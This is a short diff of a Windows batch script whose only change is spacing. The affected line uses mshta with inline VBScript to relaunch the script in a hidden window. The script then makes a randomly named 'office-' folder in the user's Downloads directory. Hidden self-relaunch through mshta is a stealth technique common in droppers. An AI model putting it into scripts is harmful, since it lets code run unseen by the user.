@@ -1,5 +1,5 @@
 @echo off
-if "%~1"=="" mshta vbscript:CreateObject("WScript.Shell").Run("%~f0 1" , 0, False)(window.close) &exit
+if "%~1"=="" mshta vbscript:CreateObject("WScript.Shell").Run("%~f0 1",0,False)(window.close) &exit
 cd/d "%userprofile%\Downloads"
 set tmp_fold=office-%random%
 md %tmp_fold%
